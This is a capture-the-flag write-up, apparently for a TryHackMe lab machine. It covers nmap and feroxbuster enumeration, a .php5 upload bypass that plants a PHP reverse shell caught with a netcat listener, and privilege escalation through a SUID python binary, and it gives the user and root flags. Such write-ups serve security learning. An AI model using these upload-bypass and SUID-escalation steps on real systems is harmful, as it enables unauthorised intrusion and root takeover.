---
share: true
---

## 1. Initial Enumeration

Started with an Nmap scan:

```bash
nmap -sV -sC -vv 10.128.187.70
```

**Results:**
- **22/tcp**: SSH
- **80/tcp**: HTTP (Apache 2.4.41 on Ubuntu)

---

## 2. Web Enumeration

Used `feroxbuster` for directory brute-forcing:

```bash
feroxbuster --url http://10.128.187.70
```

**Discovered directory:**
- `/panel/` (redirects to `/panel/`)

---

## 3. File Upload Exploit

- The web application accepts files with the `.php5` extension.
- Uploaded a PHP reverse shell as `shell.php5`.

---

## 4. Getting a Shell

1. Started a netcat listener:

    ```bash
    nc -lvnp 1234
    ```

2. Navigated to `/uploads/shell.php5` in the browser to trigger the reverse shell.

3. Upgraded the shell for better usability:

    ```bash
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    ```

---

## 5. User Flag

Searched for the user flag:

```bash
find / -type f -name user.txt 2> /dev/null
```

- **Explanation:**
    - `-type f`: search for files only
    - `-name user.txt`: look for files named `user.txt`
    - `2> /dev/null`: suppress error messages

Found the flag:

```bash
cat /var/www/user.txt
```

**User flag:**  
```
THM{y0u_g0t_a_sh3ll}
```

---

## 6. Privilege Escalation

Searched for SUID binaries:

```bash
find / -type f -user root -perm -u=s 2> /dev/null
```

Found that Python can be used for privilege escalation (reference: [GTFOBins - python](https://gtfobins.org/gtfobins/python/#reverse-shell)).

Used the following command to spawn a root shell:

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

---

## 7. Root Flag

Read the root flag:

```bash
cat /root/root.txt
```

---

## 8. Summary of Flags

- **User flag:** `THM{y0u_g0t_a_sh3ll}`
- **Root flag:** THM{pr1v1l3g3_3sc4l4t10n}
- 

---

**References:**
- [GTFOBins - python](https://gtfobins.org/gtfobins/python/#reverse-shell)

---
